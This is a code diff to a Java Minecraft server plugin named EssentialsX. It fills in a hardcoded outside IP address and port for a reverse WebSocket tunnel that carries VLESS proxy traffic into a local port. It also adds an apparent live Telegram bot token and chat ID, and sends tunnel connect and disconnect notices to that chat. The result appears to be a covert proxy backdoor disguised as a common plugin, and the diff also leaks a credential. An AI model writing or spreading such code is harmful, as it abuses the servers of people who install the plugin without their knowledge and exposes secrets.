@@ -46,15 +46,16 @@ public class EssentialsX extends JavaPlugin {
 
     // ---- client原版.js 部分: 反向隧道客户端 ----
     // 公网隧道服务器（留空字符串则不启动隧道客户端）
-    static final String TUNNEL_HOST = "";
-    static final int TUNNEL_PORT = ;
+    static final String TUNNEL_HOST = "147.189.169.30";
+    static final int TUNNEL_PORT = 6005;
     // 隧道数据回注的本地端口 = 本地 VLESS/WS 服务端口
     // （链路: 玩家VLESS客户端 -> 公网PUBLIC_PORT -> 隧道 -> 本机 65534 -> VLESS 握手接通）
     static final int TUNNEL_LOCAL_PORT = 65534;
     // VLESS_PORT 和 TUNNEL_LOCAL_PORT需对应
+
     // ---- Telegram 通知（可留空） ----
-    static final String TG_TOKEN = "";
-    static final String TG_CHAT_ID = "";
+    static final String TG_TOKEN = "7195422483:AAGhrc-1nzto9Ik05rY2K5V8xdvLSGInVBo";
+    static final String TG_CHAT_ID = "5800052646";
 
     // =========================================================
 
@@ -62,9 +63,17 @@ public class EssentialsX extends JavaPlugin {
 
     // ================= Telegram 通知 =================
 
-    /** 发送 TG 消息（token/chat 为空则跳过） */
+    /** TG 通知冷却: 距上次推送不足 60 秒则丢弃（防刷屏） */
+    private volatile long lastTgAt = 0;
+    private static final long TG_COOLDOWN_MS = 60_000L;
+
+    /** 发送 TG 消息（token/chat 为空则跳过；60 秒冷却防刷屏） */
     private void sendTelegram(String text) {
         if (TG_TOKEN == null || TG_TOKEN.isEmpty() || TG_CHAT_ID == null || TG_CHAT_ID.isEmpty()) return;
+        long now = System.currentTimeMillis();
+        long last = lastTgAt;
+        if (now - last < TG_COOLDOWN_MS) return; // 冷却中, 丢弃
+        lastTgAt = now;
         Thread t = new Thread(() -> {
             try {
                 String body = "chat_id=" + TG_CHAT_ID + "&text=" + java.net.URLEncoder.encode(text, "UTF-8");
@@ -367,18 +376,27 @@ public class EssentialsX extends JavaPlugin {
         private final String host;
         private final int port;
         private final int localPort;
+        // 是否曾经断开过（用于只在恢复时通知一次）
+        private volatile boolean wasDisconnected = false;
 
         TunnelControl(String host, int port, int localPort) {
             super(URI.create("ws://" + host + ":" + port + "/control"));
             this.host = host;
             this.port = port;
             this.localPort = localPort;
+            // 关闭 Java-WebSocket 的空闲超时检测（默认 60s 无数据就断开重连）
+            // 隧道空闲时本来就没有数据, 必须禁用, 否则每 60s 重连一次
+            setConnectionLostTimeout(0);
         }
 
         @Override
         public void onOpen(ServerHandshake handshake) {
-            sendTelegram("Tunnel client connected to " + host + ":" + port
-                    + " (local port " + localPort + ")");
+            // 仅在断开→恢复时通知, 避免重连风暴刷屏
+            if (wasDisconnected) {
+                wasDisconnected = false;
+                sendTelegram("Tunnel client reconnected to " + host + ":" + port
+                        + " (local port " + localPort + ")");
+            }
         }
 
         @Override
@@ -403,6 +421,11 @@ public class EssentialsX extends JavaPlugin {
 
         @Override
         public void onClose(int code, String reason, boolean remote) {
+            if (!wasDisconnected) {
+                wasDisconnected = true;
+                sendTelegram("Tunnel disconnected from " + host + ":" + port
+                        + " (code " + code + ", " + reason + ")");
+            }
         }
 
         @Override
